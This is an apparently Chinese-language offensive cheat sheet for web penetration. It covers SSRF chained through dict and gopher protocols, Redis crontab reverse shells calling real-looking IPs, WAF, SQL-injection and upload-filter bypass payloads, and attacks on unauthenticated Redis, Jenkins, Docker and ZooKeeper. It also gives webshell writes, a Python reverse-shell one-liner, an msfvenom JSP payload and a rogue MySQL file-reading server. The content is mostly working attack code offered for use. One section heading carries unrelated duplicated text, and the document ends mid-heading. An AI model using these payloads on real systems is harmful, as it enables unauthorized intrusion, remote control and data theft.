![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpdzv1OuRHAKZo5MFibys3W5ZicI93iaQp8IF3xhWLsgPf7miauGq1NjCbhA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFph947hibPlDvDWqMabibwnTTnsZuxtqn83q7lcYSq50Dbibq3MfzxgacIg/640?wx_fmt=png)

###### **302 反弹 shell**  

```
?url=http://xxxx/302.php?s=dict&ip=10.20.\*.\*&port=6379&data=flushall
302.php
<?php
$ip = $\_GET\['ip'\];
$port = $\_GET\['port'\];
$scheme = $\_GET\['s'\];
$data = $\_GET\['data'\];
header("Location: $scheme://$ip:$port/$data");
?>
?url=http://xxxx/reverse.php?s=dict&ip=10.20.\*.\*&port=6379&bhost=\*.\*.\*.\*&bport=1234
reverse.php
<?php
$ip = $\_GET\['ip'\];
$port = $\_GET\['port'\];
$bhost = $\_GET\['bhost'\];
$bport = $\_GET\['bport'\];
$scheme = $\_GET\['s'\];
header("Location: $scheme://$ip:$port/set:0:\\"\\\\x0a\\\\x0a\*/1\\\\x20\*\\\\x20\*\\\\x20\*\\\\x20\*\\\\x20/bin/bash\\\\x20-i\\\\x20>\\\\x26\\\\x20/dev/tcp/{$bhost}/{$bport}\\\\x200>\\\\x261\\\\x0a\\\\x0a\\\\x0a\\"");
?>
?url=http://xxxx/302.php?s=dict&ip=10.20.\*.\*&port=6379&data=config:set:dir:/var/spool/cron/
?url=http://xxxx/302.php?s=dict&ip=10.20.\*.\*&port=6379&data=config:set:dbfilename:root
?url=http://xxxx/302.php?s=dict&ip=10.20.\*.\*&port=6379&data=save
可设置burp–>intruder指定变量跑。

```

```
Mysql

```

```
https://github.com/FoolMitAh/mysql\_gopher\_attack
https://fireshellsecurity.team/isitdtu-friss/

```

###### Weblogic SSRF+Redis

```
探测
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80
Redis反弹
set 1 "\\n\\n\\n\\n\* \* \* \* \* root bash -i >& /dev/tcp/121.36.67.230/4444 0>&1\\n\\n\\n\\n"
config set dir /etc/
config set dbfilename crontab
save
/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn\*%20\*%20\*%20\*%20\*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
SSRF+内网Struct2
http://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/

```

```
Ueditor SSRF


```

```
/editor/ueditor/php/controller.php?action=catchimage&source\[\]=http://my.ip/?aaa=1%26logo.png

```

```
Discuz


```

```
/forum.php?mod=ajax&action=downremoteimg&message=\[img=1,1\]http://b182oj.ceye.io/xx.jpg\[/img\]&formhash=xxoo

```

**探测存活主机**

```
直接访问
http://www.xx.com/ssrf.php?url=http://192.168.0.1

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpJ4zkd0uRtJK0IICl4ZZiavljviaEDBCMVDM8cHhoXicciaE1hlia4TzmFGg/640?wx_fmt=png)

```
伪造POST请求


```

```
\>curl -v 'http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/\_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20\*/\*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb'

```

```
绕过方法


```

```
本地绕过
http://127.0.0.1=http://localhost
\[::\]绕过
http://\[::\]:80=http://127.0.0.1
@绕过
http://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080
利用短网址
http://tool.chinaz.com/tools/dwz.aspx
http://dwz.cn/
DNS解析
http://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1
自己域名设置A记录，指向127.0.0.1
进制转换
127.0.0.1
八进制：0177.0.0.1
十六进制：0x7f.0.0.1
十进制：2130706433
http://www.bejson.com/convert/ip2int/
句号
127。0。0。1
302脚本
<?php
$ip = $\_GET\['ip'\];
$port = $\_GET\['port'\];
$scheme = $\_GET\['s'\];
$data = $\_GET\['data'\];
header("Location: $scheme://$ip:$port/$data");
?>
攻击方VPS监听8080
dict协议
dict://www.attack.com:8080/hello:dict等于
ssrf.php?url=http://attack.com/302.php?s=dict&ip=www.attack.com&port=8080&data=hello:dict
Gopher协议
gopher:// www.attack.com:8080/gopher
ssrf.php?url=http://attack.com/302.php?s=gopher&ip=www.attack.com&port=8080&data=gopher
File协议
攻击机新建file.php
<?php
header("Location: file:///etc/passwd");
?>
ssrf.php?url=http://attack.com/file.php

```

###### gopher 协议的脚本转换

```
抓取本地测试的正常请求
>socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpcsj3tGUexBC934NcAYn4Zme0fxemvjZMfJzoicUmzLtfDv2GyDXqb8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpqWlouNiaTicBjtLiaPr001uVKbia1pXyDrpIt8UIsX4Ap0yK9cRzrD76Kw/640?wx_fmt=png)

```
将捕获日志保存txt
使用脚本转换为支持gopher协议的字符串
转换规则
如果第一个字符是>或者< 那么丢弃该行字符串，表示请求和返回的时间。
如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。
将\\r字符串替换成%0d%0a
空白行替换为%0a

```

```
本地可执行


```

```
远程执行需对空格进行编码后再url编码一次
\*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a\*/1%20\*%20\*%20\*%20\*%20bash%20-i%20>&%20/dev/tcp/192.168.0.108/12138%200>&1%0a%0a%0a%0a%0d%0a\*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a\*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a\*1%0d%0a$4%0d%0asave%0d%0a\*1%0d%0a$4%0d%0aquit%0d%0a

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpsqfAzk9gU9T5TbQpjNBGPkLbEDna4iccDRRPW9CugmiaKFTgRddxnk8w/640?wx_fmt=png)

###### 协议

```
Curl版本需低于7.15.1
file:可回显时，使用file读取任意文件
dict:查看端口，操作内网服务
gopher:可发出get/post请求
使用gopher协议时，要进行两次url编码
http/https:探测存活主机

```

#### Fuzz / 扫描 web

```
#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a "USER-AGENT" –c "Cookie" -z 100
#nikto -C all -h http://192.168.0.107 nikto扫描web服务
#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt 枚举用户爆破密码
#wpscan --url http://192.168.0.107/ -e vp 扫描漏洞插件
#perl joomscan.pl --url 192.168.0.107

```

##### WFuzz

```
爆破文件和文件夹
>wfuzz -w wordlist URL/FUZZ.php
>wfuzz -w wordlist URL/FUZZ
枚举数字参数
>wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ
POST账号密码爆破FUZnZ
>wfuzz -w userList -w pwdList -d "user http://127.0.0.1/login.php
随机HTTP头
>wfuzz -z range,0000-9999 -H "X-Forwarded-For: FUZZ" http://127.0.0.1/get.php?userid=666
使用代理fuzz
>wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ
基础认证爆破
>wfuzz -z list,"username-password" --basic FUZZ:FUZZ URL
【结果过滤】--hc或--ss不显示符合条件的结果。
【结果过滤】--sc或--sl或--sw或--sh显示符合条件的结果。

```

##### Cewl

```
爬行网站存为字典
>cewl http://www.qq.com/ -w dict.txt
指定字典长度
>cewl http://www.qq.com/ -m 9 -w dict.txt
网站提取Email
>cewl http://www.qq.com/ -n –e

```

##### Dirsearch

```
\>python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt –url http://127.0.0.1

```

```
Bypass WAF


```

##### SQL 注入分块传输

```
https://github.com/c0ny1/chunked-coding-converter

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpj5ZPmqyRASLAz0RhJKH3yV1oUDYRIQ3fs2O1wuNQUuwyjJvA7riahYA/640?wx_fmt=png)

```
跑注入点被拦截


```

```
使用分块传输，右键选择


```

  
使用 SQLMAP 跑注入

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp0dApIbYYKNRydfrty5GSZMWIMxh5zw1kiaRv1SAib7UtkPcVkc1eQG3Q/640?wx_fmt=png)

```
\>python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpa8RpUtWo4LqTDE2WqicQlEb0UibhaUf9VV9M68KUCuCia5pPxbXJYF4hA/640?wx_fmt=png)

**自动提供可用的 tamper**

```
https://github.com/m4ll0k/Atlas
GET类型的注入
python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
POST类型的注入
python atlas.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
请求头注入
python atlas.py --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload="-1234 AND 4321=4321-- AAAA" --random-agent -v
组合tamper
python atlas.py --url http://site.com/index/id/%%10%% --payload="-1234 AND 4321=4321-- AAAA" --concat "equaltolike,htmlencode" --random-agent -v
列出tamper
python atlas.py -g
例子
注入
python sqlmap.py -u 'http://site.com/index.php?id=Price\_ASC' --dbs --random-agent -v 3

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpFhJVVWbAdDjwhX1wPwrXrGv49uTKPeJsedNwZRHkAPRzfySPGT8pAA/640?wx_fmt=png)

```
可以看到被拦截了
查找能绕过的tamper
python atlas.py --url 'http://site.com/index.php?id=Price\_ASC' --payload="') AND 8716=4837 AND ('yajr'='yajr" --random-agent -v

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpG8GeL4wnZtM4JarZcRG4c9e8GzJzFPJFSaGz5sMSdgqOlzqnKcghEQ/640?wx_fmt=png)

```
根据返回码200得到一个可绕过waf的tamper
versionedkeywords这个tamper
继续注入
python sqlmap.py -u 'http://site.com/index.php?id=Price\_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords
根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。

```

##### 垃圾数据

```
#coding=utf-8
import random,string
from urllib import parse
# code by yzddMr6
varname\_min = 5
varname\_max = 15
data\_min = 20
data\_max = 25
num\_min = 50
num\_max = 100
def randstr(length):
  str\_list = \[random.choice(string.ascii\_letters) for i in range(length)\]
  random\_str = ''.join(str\_list)
  return random\_str
def main():
  data={}
  for i in range(num\_min,num\_max):
    data\[randstr(random.randint(varname\_min,varname\_max))\]=randstr(random.randint(data\_min,data\_max))
  print('&'+parse.urlencode(data)+'&')
main()
放到要注入的字段前后

```

##### **上传 bypass**

###### **图片文件头**

```
PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A
GIF 为 47 49 46 38 37 61
JPG 为 FF D8 FF E0

```

###### 添加图片头或合并图片包含

###### 后缀大小写、文件名前缀加、上传. htaccess

```
SetHandler application/x-httpd-php

```

###### 二次渲染

```
GIF
找好一个大一点的GIF，尾部使用c32插入shell，上传，下载回来，使用burp的comparer功能找出整个文件没有被渲染的位置，插入shell再上传
JPG
使用脚本直接生成
https://github.com/BlackFan/jpg\_payload
PNG
使用脚本直接生成
先取消php.ini注释;extension=php\_gd2.dll
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
       0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
  $r = $p\[$y\];
  $g = $p\[$y+1\];
  $b = $p\[$y+2\];
  $color = imagecolorallocate($img, $r, $g, $b);
  imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./1.png');
?>

```

###### 上传 php3,php4,phtml 等

###### 文件名后加::$DATA

```
ConTent-Disposition: form-data; 
ConTent-Disposition: form-data; 1.asp::$DATA\\0x00\\1.asp0x00.jpg"

```

```
asp . (空格+.)


```

###### php. .(点 + 空格 + 点)

###### 双写 phphpp

###### 00 截断

```
Get参数00截断直接添加%00
POST参数00截断修改hex为00

```

```
修改一些固定的参数

```

###### 文件名去掉双引号、加一个 filename1 的参数、form 变量改成 f+orm、去掉 form-data、在 Content-Disposition 或 form-data; 后添加多个空格

###### 引号回车

```
ConTent-Disposition: form-data; backlion.asp
"

```

###### Content-Type 和 ConTent-Disposition 调换位置

###### 文件名前缀加空格

```
file

```

```
name前加空格


```

```
Content-Disposition: form-data;      

```

```
form-data的前后加上+


```

```
Content-Disposition: +form-data; 

```

```
ASP+IIS


```

```
s%elect>select
s%u0065lect>select  
s%u00f0lect>select
s%u0045lect = s%u0065lect = %u00f0lect
u -->%u0055 --> %u0075
n -->%u004e --> %u006e
i -->%u0049 --> %u0069
o -->%u004f --> %u006f -->%u00ba
s -->%u0053 --> %u0073
l -->%u004c --> %u006c
e -->%u0045 --> %u0065-->%u00f0
c -->%u0043 --> %u0063
t -->%u0054 -->%u0074 -->%u00de -->%u00fe
f -->%u0046 -->%u0066
r -->%u0052 -->%u0072
m -->%u004d -->%u006d

```

```
Asp+iis&aspx+iis


```

```
s%u006c%u0006ect>select

```

```
apache


```

```
TEST /sql.php?id=1 HTTP/1.1

```

```
大小写/关键字


```

```
UniOn SeLECT
Mid()substring()  substr()
Hex()ascii()
sleep() =benchmark()
concat\_ws()=group\_concat()

```

##### 双重 url 编码

##### 变换请求方式

##### HPP 参数污染

```
id=1&id=2&id=3
得到的结果：Asp.net + iis：id=1,2,3 
Asp+iis：id=1,2,3 
Php+apache：id=3
MSSQL:
GET+POST: 
GET:http://192.168.125.140/test/sql.aspx?id=1 union/\*
post:  id=2\*/select null,null,null
无逗号形式：
?id=1 union select 1&id=2&id=3&id=4 from admin--（）  
利用逗号：
?a=1+union/\*&b=\*/select+1,pass/\*&c=\*/from+users--
无效参数形式：
?a=/\*&sql=xxx&b=\*/  a,b为无效参数
溢出形式：?id=1/\*&id=\*//\*&id=\*//\*......&id=\*//\*&id=\*/ union  select null,system\_user,null from INFORMATION\_SCHEMA.schemata
MYSQL：
?id=1&id=1&id=1&id=1&id=1&id=1&id=1&id=….. &id=1 union select 1,2 from admin

```

```
数据库


```

```
Access
空格符
%09、%0a、%0c、%0d、%16

```

###### Mysql  

```
注释符
#、/\*...\*/、--\[空格\] ...
空格符
\[0x09,0x0a-0x0d,0x20,0xa0\]
特殊符号
%a 换行符，可结合注释符使用%23%0a，%2d%2d%0a。
%21  ！叹号
%2b  +  加号
%2d  -  减号
%40  @  符号
%7e   ~  波浪号
Id=1 union select(1),user()
Id=1 union /!12345select/1,user()
Id=1 union select@1,user()
Id=1 union select {x 1},user()
Id=1 union select"1",user()
Id=1 union select\\N,user()
Id=1 union select 1,user()\`
Id=1 union select 1,user()""
Id=1 union select 1,user()A
Id=1 union select 1,user()\`b
Id=1 union(select 1,(select/!schema\_name/from information\_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select{x schema\_name}from information\_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select(schema\_name)from information\_schema.SCHEMATA limit 1,1))
浮点数
Id= 1.0union select 1,user()
Id= 1.union select 1,user()
Id= 1E0union select 1,user()
Id=\\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\\Nfrom admin
内联注释
/\*!UnIon12345SelEcT\*/ 1,user()   //数字范围 1000-50540
mysql黑魔法
select{x username}from {x11 test.admin};
函数
截取
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)) 
连接
concat(version(),'|',user());
concat\_ws('|',1,2,3)
字符转换
Ascii() Char() Hex() Unhex()
过滤逗号
127' UNION SELECT \* FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
相当于 union select 1,2,3,4,5
union select \* from (select 1)a join(select{x schema\_name} from information\_schema.SCHEMATA limit 1,1)b
limit 1 offset 0相当于limit 1,0
mid(version() from 1 for 1)相当于Mid(version(),1,1)
<>被过滤
id=1 and ascii(substr(database(),0,1))>64
比较符
greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值
id=1 and greatest(ascii(substr(database(),0,1)),64)=64
函数构造
sleep(5)/benchmark(10000000,SHA1(1))
id=1 xor sleep%23%0a(5)
id=1 xor sleep%2d%2d%0a(5)
id=1 xor sleep(\[%20\]5) 
id=1 xor benchmark%0a(10000000,SHA1(1))
id=1 xor sleep\[空白字符\](5)
select{x\[可填充字符\]1}

```

```
MSSQL


```

```
注释符
/\*、--、;00%、/\*\*/
空格符
\[0x01-0x20\]\[0x0a-0x0f\]\[0x1a-0x-1f\]
特殊符号
%3a 冒号
id=1 union:select 1,2 from:admin
id=1 union select+1,'2',db\_name() from admin
id=1 union select-1,'2',db\_name() from admin
id=1 union select.1,'2',db\_name() from admin
id=1 union select:1,'2',db\_name() from admin
id=1 union select~1,'2',db\_name() from admin
id=1%20union%20select%201,'2',db\_name()%80from%20admin
id=1 union select 1,'2',db\_name+() from admin
函数变形: db\_name\[空白字符\]()
浮点数
id=1.1union select 1,'2',db\_name()
id=1e0union select 1,'2',db\_name()
运算符
id=1-1union select '1',system\_user,3 from admin
id=1e-union select '1',system\_user,3 from admin
字符串截取函数
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
charindex('test',db\_name())
字符串转换函数
Ascii('a')=char(97) 括号之间可添加空格

```

##### WAF

```
同时提交GET和POST
访问HTTP绕过对HTTPS的防护
%00截断
参数填充垃圾数据，缓冲区溢出
X-FORWARDED-FOR伪造绕过
静态文件/sql.php/1.js?id=1绕过
白名单绕过，URL只要存在某字符就不会拦截
/sql.php/admin.php?id=1
/sql.php?a=/manage/&b=../etc/passwd
/../../../manage/../sql.asp?id=2
伪造User-agent绕过，可改为爬虫agent

```

#### **未授权访问**

##### **Redis 未授权访问**

###### 测试

```
\>redis-cli -h 127.0.0.1 flunshall 
192.168.0.110:6379>ping
PONG 存在未授权访问

```

###### JS 打内网

```
var cmd = new XMLHttpRequest();      
cmd.open("POST", "http://127.0.0.1:6379");      
cmd.send('flushall\\r\\n');             
var cmd =new XMLHttpRequest();      
cmd.open("POST", "http://127.0.0.1:6379");      
cmd.send('eval \\'' + 'redis.call(\\"set\\",\\"1\\",\\"\\\\n\\\\n\*/1 \* \* \* \* /bin/bash -i >&/dev/tcp/外网IP/5566 0>&1\\\\n\\\\n");redis.call(\\"config\\", \\"set\\", \\"dir\\",\\"/var/spool/cron/\\"); redis.call(\\"config\\",\\"set\\", \\"dbfilename\\", \\"root\\");' + '\\' 0' +"\\r\\n");       
var cmd =new XMLHttpRequest();      
cmd.open("POST", "http://127.0.0.1:6379");       
cmd.send('save\\r\\n');

```

###### 反弹 shell

```
保存为sh
echo -e "\\n\\n\*/1 \* \* \* \* /bin/bash -i >& /dev/tcp/192.168.0.108/12138 0>&1\\n\\n"|redis-cli -h $1 -p $2 -x set 1
echo -e "\\n\\n \*/1 \* \* \* \* python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("192.168.0.108",12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'\\n\\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
执行
>bash 1.sh 192.168.0.120 6379

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpEUTPfoprSHOvsaX5eJYHN8fha4fLBD8icVPH5cMAKxNDpUh2hzhp9ibg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpwxiaW0sGWcibLMficRYy3u9J5NSHjhXVY7gwSloZhr3Iu8um7v1HJu6CQ/640?wx_fmt=png)

###### 写 shell

```
6379> config set dir /var/www/html/
6379> config set dbfilename shell.php
6379> set x "<?php phpinfo();?>"
6379> save

```

###### SSH

```
ssh-keygen
本地生成一对密钥
https://github.com/JoyChou93/hackredis
>ssh-keygen -t rsa -C "xx@xx.com"
>(echo -e "\\n\\n"; cat /root/.ssh/id\_rsa.pub; echo -e "\\n\\n") > qq.txt
>redis-cli -h 127.0.0.1 flunshall
>cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit
>redis-cli -h 127.0.0.1
6379> config set dir /root/.ssh/
6379> config set dbfilename "authorized\_keys"
6379> save
本地登录
#ssh -i id\_rsa root@11.11.11.11

```

###### redis-rogue-getshell

```
https://github.com/vulhub/redis-rogue-getshell
需要python3.0以上
编译
>cd RedisModulesSDK/
>make
会在此目录下生成exp.so
执行命令
>python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c "cat /etc/passwd"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpibKLOvQPlicictOJgyq5EZPmUQ8MDtRWOiaT8j3plYFF1UC2CIvu1JuJow/640?wx_fmt=png)

###### redis-rogue-server  

```
https://github.com/n0b0dyCN/redis-rogue-server
需要python3.6以上
编译
>cd RedisModulesSDK/exp
>make
执行
>./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpKujsVuMcibWwv1dp7VdHg21KqBe7HqYOhVuApY1icWydGDhFIOjxWnzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpgfdsmTqrmey9wRY24icDOvt7Q4JaVEQN0jmbw0p2m2OSuoQicJHndFqg/640?wx_fmt=png)

`也可以反向shell`

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpU4C0ia3pxQ8rchzESFz4AwGMrVFOhjDqx2QsiaqA1swdlO4eSZE1bCAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFp0wKRXZyah24dBRfuR484gfMgXr9ZxaqbOG3dNGZoOtnqVy76uyQJKw/640?wx_fmt=png)

###### Lua RCE

```
https://github.com/QAX-A-Team/redis\_lua\_exploit
修改redis\_lua.py里的 host 为目标 IP
执行返回正常，反弹shell
>eval "tonumber('/bin/bash -i >& /dev/tcp/192.168.0.108/12345 0>&1', 8)" 0

```

```
Jenkins未授权访问


```

```
http://www.qq.com:8080/manage
http://www.qq.com:8080/script
执行命令
>println "ifconfig -a".execute().text
反弹shell
>println "wget http://your.com/back.py -P /tmp/".execute().text
>println "python /tmp/back.py yourIP 8080".execute().text
写shell
>println "wget http://your.com/t.txt -o /var/www/html/1.php".execute().text
>new File("/var/www/html/1.php").write('<?php @eval($\_POST\[1\]);?>');
>def webshell = '<?php @eval($\_POST\[1\]);?>'
>new File("/var/www/html/1.php").write("$webshell");

```

##### MongoDB 未授权访问

```
默认端口27017直接连接进行增删改查

```

##### ZooKeeper 未授权访问

```
默认端口2181
获得服务器环境信息
>echo envi|nc 192.168.0.1 2181
连接
>./zkCli.sh -server ip:port

```

##### Elasticsearch 未授权访问

```
默认端口9200
http://1.1.1.1:9200/\_plugin/head/
http://1.1.1.1:9200/\_nodes
http://1.1.1.1:9200/\_river
http://1.1.1.1:9200/\_plugin/sql/

```

```
Memcache未授权访问


```

```
默认端口11211
>telnet 1.1.1.1 11211
>nc -vv 1.1.1.1 11211

```

##### Hadoop 未授权访问

```
默认端口50070

```

##### Docker 未授权访问

```
默认端口2375
>docker -H tcp://1.1.1.1:2375 images
Shipyard默认密码
admin/shipyard

```

##### ActiveMQ 未授权访问

```
反编译app文件，查找可能会包含oss key的文件，如JS。
OSSAccessKey、AccessKeySecret使用OSS浏览器访问。第三方行云管家可修改密码。

```

```
阿里云OSS Key利用


```

```
反编译app文件，查找可能会包含oss key的文件，如JS。
OSSAccessKey、AccessKeySecret使用OSS浏览器访问。第三方行云管家可修改密码。

```

```
Linux绕过disable\_function


```

```
https://github.com/yangyangwithgnu/bypass\_disablefunc\_via\_LD\_PRELOAD
http://192.168.0.107/bypass\_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass\_disablefunc\_x64.so
outpath是命令输出位置，sopath指定so文件路径。

```

#### Tomcat Ajp LFI&RCE

```
LFI
https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner
>python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.0.110 -p 8009 -f pass

```

RCE  

```
\>msfvenom -p java/jsp\_shell\_reverse\_tcp LHOST=192.168.0.107 LPORT=12138 R >/var/www/html/1.jpg
配合目标文件上传传入服务器

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpviaLtkGB1WibpEhRF8gA982lXueibBCo8uOUE1B5W9R7nmOg9kpb8cCjA/640?wx_fmt=png)

```
\>java -jar ajpfuzzer\_v0.6.jar
>connect 192.168.0.110 8009
>forwardrequest 2 "HTTP/1.1" "/index.jsp" 192.168.0.107 192.168.0.107 porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request\_uri:index.jsp","javax.servlet.include.path\_info:/1.jpg","javax.servlet.include.servlet\_path:/"

```

![](https://mmbiz.qpic.cn/mmbiz_png/La0UYqKZf7fDjagkuGicOTtxWwzIiajYFpS10hh30mVoleXuib8nAPYJqxIb28DUbNgkQRZCdFK8l1x861dzDqksA/640?wx_fmt=png)

#### Mysql 连接文件读取  

```
https://github.com/Gifts/Rogue-MySql-Server
客户端必须启用LOCAL-INFILE
客户端支持非SSL连接
目标web存在adminer等可检查数据库连接的脚本。
攻击机本地运行python构造假mysql服务，使用目标web连接，读取文件。
#coding=utf-8
import socket
import logging
logging.basicConfig(level=logging.DEBUG)
file
sv=socket.socket()
sv.bind(("",3305))
sv.listen(5)
conn,address=sv.accept()
logging.info('Conn from: %r', address)
conn.sendall("\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00")
conn.recv(9999)
logging.info("auth okay")
conn.sendall("\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00")
conn.recv(9999)
logging.info("want file...")
wantfile=chr(len(filename)+1)+"\\x00\\x00\\x01\\xFB"+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()

```

#### Mysql 开启外连

```
\>grant all privileges on user.\* to user@"%" identified by "P@ssw0rd";

```

```
MSSQL&Agent Job上线


```

```
